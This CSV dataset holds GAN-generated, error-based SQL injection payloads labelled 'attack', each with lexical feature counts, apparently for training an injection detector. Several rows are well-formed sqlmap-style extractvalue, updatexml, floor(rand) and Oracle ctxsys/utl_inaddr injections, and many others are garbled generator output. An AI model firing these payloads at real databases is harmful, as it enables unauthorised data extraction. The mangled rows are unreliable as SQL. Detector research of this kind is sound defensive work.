label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,1%106,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1177,5.0,4.0,1.9219280948873623,0.0,4.0,0.0,1.0,0.0,0.8,0.0,0.2,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-5032' or select row,r  (  0x5c,  case else 0 end  )  ,0x717a767a71,floor  (  112  (  9067  )  9173,1   )    )    )       ,7864   )    having tctlyslole_",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1178,153.0,35.0,4.002888149595251,49.0,32.0,54.0,18.0,0.3202614379084967,0.20915032679738563,0.35294117647058826,0.11764705882352941,1.0,0.0,1.0,0.0,0.0,0.0,0.0,9.0,0.0,1.0,6.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 's",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1179,299.0,38.0,3.995038566517631,103.0,55.0,109.0,32.0,0.34448160535117056,0.18394648829431437,0.36454849498327757,0.10702341137123746,2.0,0.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'y",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1180,180.0,27.0,3.357845373830658,40.0,35.0,81.0,24.0,0.2222222222222222,0.19444444444444445,0.45,0.13333333333333333,2.0,0.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1'||  (  select '_ar,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1181,20.0,13.0,3.441446071165522,8.0,1.0,5.0,6.0,0.4,0.05,0.25,0.3,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-7864  )  ||  (  0  >  =  ,  4232  )   and 7158  )  ,0x717a767a71,floor  (  select   )    0x717a767a71,floor  ||chr  (  112  )  ,1     )   )    )   ,0x717a767a71,floor  =  )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1182,177.0,30.0,3.6609946523876076,36.0,44.0,68.0,29.0,0.2033898305084746,0.24858757062146894,0.384180790960452,0.1638418079096045,0.0,0.0,3.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,7.0,10.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'j'  =  'f",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1183,243.0,35.0,3.9543986345029314,83.0,45.0,87.0,28.0,0.34156378600823045,0.18518518518518517,0.35802469135802467,0.11522633744855967,4.0,0.0,0.0,0.0,0.0,3.0,0.0,14.0,0.0,0.0,5.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%gi",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1184,338.0,35.0,3.5667949118075866,86.0,49.0,144.0,59.0,0.25443786982248523,0.14497041420118342,0.4260355029585799,0.17455621301775148,2.0,0.0,0.0,0.0,0.0,2.0,0.0,30.0,2.0,0.0,1.0,22.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'||  (  select 'zbu"" like ""yle",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1185,31.0,17.0,3.7152810859814975,16.0,1.0,7.0,7.0,0.5161290322580645,0.03225806451612903,0.22580645161290322,0.22580645161290322,2.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fn",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1186,333.0,37.0,3.773254831977928,103.0,55.0,137.0,38.0,0.30930930930930933,0.16516516516516516,0.4114114114114114,0.11411411411411411,2.0,0.0,0.0,0.0,2.0,1.0,0.0,26.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,1'||  (  select '_iandddr,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1187,25.0,16.0,3.7492750707107136,13.0,1.0,5.0,6.0,0.52,0.04,0.2,0.24,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%""   )    )    )    ANDSE R  )  0 9173 FROM   (  0  =  4510",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1188,60.0,22.0,3.022059585169851,10.0,11.0,31.0,8.0,0.16666666666666666,0.18333333333333332,0.5166666666666667,0.13333333333333333,0.0,1.0,0.0,0.0,0.0,1.0,0.0,5.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1189,343.0,34.0,3.5380841402836896,84.0,49.0,148.0,62.0,0.24489795918367346,0.14285714285714285,0.4314868804664723,0.18075801749271136,0.0,4.0,0.0,0.0,0.0,3.0,0.0,30.0,2.0,0.0,1.0,23.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'wfv'  =  '5305orselect from chr  (  *  )  || chr  (  0  )   when   (  0  >  1297,1  )  andros group by p group by  )  a group 5192 by xabpx",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1190,468.0,43.0,3.903561731394874,151.0,60.0,186.0,71.0,0.32264957264957267,0.1282051282051282,0.3974358974358974,0.1517094017094017,4.0,0.0,0.0,0.0,1.0,3.0,0.0,35.0,0.0,3.0,1.0,27.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,-3775'  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1191,13.0,7.0,2.5654483718208256,0.0,4.0,4.0,5.0,0.0,0.3076923076923077,0.3076923076923077,0.38461538461538464,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1192,343.0,35.0,3.5497459478638644,84.0,49.0,148.0,62.0,0.24489795918367346,0.14285714285714285,0.4314868804664723,0.18075801749271136,2.0,2.0,0.0,0.0,0.0,3.0,0.0,30.0,2.0,0.0,1.0,23.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'yw.z""  =  ""owuela",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1193,191.0,34.0,3.6832524164974982,61.0,24.0,80.0,26.0,0.3193717277486911,0.1256544502617801,0.418848167539267,0.13612565445026178,2.0,2.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,4.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"r (  112  )  5840,1   )    )    )     =  ,0x717a767a71,floor  (  select cod_rinaddr.set_naddres group ax,NCT  and  )  ||chr  (  113  )  ||c(  rand  =  0  ),0x717a767a71,floor  =     ),1 where 4493  select   =  4232,0x717a767a71  )  >  adr  (  0x7171706a71,0x717a767a71,floor  =   by x 7158  )  00x717a767a712   )    )    having information_schemaltt_an_z",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1194,354.0,45.0,4.300547686903516,126.0,82.0,103.0,43.0,0.3559322033898305,0.23163841807909605,0.2909604519774011,0.12146892655367232,0.0,0.0,0.0,0.0,0.0,5.0,0.0,17.0,0.0,5.0,10.0,10.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  """" or 1 erocoww where duaed_roseamee  (  ,  (  6055,1   )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1195,328.0,39.0,4.010553717543469,126.0,40.0,119.0,43.0,0.38414634146341464,0.12195121951219512,0.3628048780487805,0.13109756097560976,0.0,3.0,3.0,0.0,2.0,1.0,0.0,23.0,0.0,3.0,7.0,6.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,2.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzn",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1196,232.0,31.0,3.646947858037865,73.0,37.0,96.0,26.0,0.3146551724137931,0.15948275862068967,0.41379310344827586,0.11206896551724138,2.0,0.0,0.0,0.0,0.0,1.0,0.0,18.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'swuawzsf",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1197,187.0,29.0,3.497564015515534,47.0,35.0,81.0,24.0,0.25133689839572193,0.18716577540106952,0.43315508021390375,0.12834224598930483,2.0,0.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1   )    )    )    )    or 1 DIyRTEFROM cNGE  = ands   (  *0x717a767a71,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1198,71.0,28.0,3.564236614647558,23.0,11.0,30.0,7.0,0.323943661971831,0.15492957746478872,0.4225352112676056,0.09859154929577464,0.0,0.0,0.0,0.0,1.0,1.0,0.0,5.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'   =  ,1   as 2017 ROowhere selectsx4838_n where 1  =  ,  extractvalue,  (  ||c  (  (  \,concat  0x7171706a71,  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1199,284.0,37.0,4.018565717897282,83.0,67.0,96.0,38.0,0.29225352112676056,0.23591549295774647,0.3380281690140845,0.13380281690140844,2.0,0.0,0.0,0.0,0.0,5.0,0.0,14.0,0.0,1.0,11.0,9.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"-9740""  )  )  ,0x717a767a71eLe_inz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1200,34.0,19.0,3.8810054880546367,9.0,13.0,6.0,6.0,0.2647058823529412,0.38235294117647056,0.17647058823529413,0.17647058823529413,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'fanz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1201,174.0,28.0,3.563019367354158,41.0,39.0,71.0,23.0,0.23563218390804597,0.22413793103448276,0.40804597701149425,0.13218390804597702,2.0,0.0,0.0,0.0,0.0,1.0,0.0,14.0,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1202,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'  and   (  ||chr  (  ctadraddret_hbys dUS v   (  el_inaddr.s FROM   (    R#)    '  =  'e_iininadseradresstrs asd_s s   (  ||chr  (  0x7171706a71,1   )    )    einiin   FROM   (S     )  ,  SELECT  union 1  )  ,0x717a767a71,1   )    or concat  (  select when    (  1297,1   )    )   havingk",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1203,290.0,46.0,4.095935676219776,119.0,28.0,107.0,36.0,0.4103448275862069,0.09655172413793103,0.3689655172413793,0.12413793103448276,3.0,0.0,0.0,0.0,0.0,1.0,0.0,17.0,0.0,4.0,5.0,5.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nzp'  =  'zaw' like '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1204,221.0,33.0,3.496223176256489,56.0,32.0,101.0,32.0,0.25339366515837103,0.14479638009049775,0.45701357466063347,0.14479638009049775,4.0,2.0,0.0,0.0,1.0,2.0,0.0,18.0,0.0,0.0,4.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzwzwzww'  =  'mwf",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1205,219.0,31.0,3.507601434980374,58.0,32.0,99.0,30.0,0.2648401826484018,0.1461187214611872,0.4520547945205479,0.136986301369863,2.0,2.0,0.0,0.0,1.0,2.0,0.0,18.0,0.0,0.0,4.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%g~wp9176",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1206,344.0,39.0,3.6485070717235417,87.0,53.0,144.0,60.0,0.25290697674418605,0.15406976744186046,0.4186046511627907,0.1744186046511628,2.0,0.0,0.0,0.0,0.0,2.0,0.0,30.0,2.0,0.0,1.0,22.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
